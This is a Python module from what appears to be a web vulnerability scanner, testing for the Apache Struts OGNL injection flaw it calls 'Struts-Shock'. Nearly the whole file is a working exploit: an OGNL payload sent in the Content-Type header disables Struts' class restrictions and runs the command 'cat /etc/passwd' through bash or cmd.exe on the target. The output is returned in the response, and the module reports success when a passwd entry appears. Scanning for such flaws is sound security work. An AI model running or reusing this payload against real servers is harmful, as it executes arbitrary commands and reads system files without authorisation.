import contextlib
import re

from request import request
from utils import output


class StrutsShock:
    def __init__(self, agent, proxy, redirect, timeout, url, cookie):
        self.url = url
        self.cookie = cookie
        self.output = output.Output()
        self.request = request.Request(
            agent=agent,
            proxy=proxy,
            redirect=redirect,
            timeout=timeout
        )

    def run(self):
        info = {
            'name': 'StrutsShock',
            'fullname': 'StrutsShock',
            'author': 'Momo Outaadi (M4ll0k)',
            'description': 'Checking Struts-Shock Vulnerability'
        }
        self.output.test('Scanning struts-shock vuln..')
        with contextlib.suppress(Exception):
            payload = "%{(#_='multipart/form-data')." + "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."

            payload += "(#_memberAccess?"
            payload += "(#_memberAccess=#dm):"
            payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
            payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
            payload += "(#ognlUtil.getExcludedPackageNames().clear())."
            payload += "(#ognlUtil.getExcludedClasses().clear())."
            payload += "(#context.setMemberAccess(#dm))))."
            payload += "(#cmd='cat /etc/passwd')."  # cmd command = cat /etc/passwd
            payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
            payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
            payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
            payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
            payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
            payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
            payload += "(#ros.flush())}"
            resp = self.request.send(
                url=self.url,
                method="GET",
                headers={'Content-Type': payload},
                payload=None,
                cookies=self.cookie
            )
            if resp.status_code == 200 and re.search(r'.*?:/bin/bash', resp.content.decode('utf-8'), re.I):
                self.output.plus('The site is my be vulnerable to Struts-Shock. '
                                 'See also https://www.exploit-db.com/exploits/41570/.')
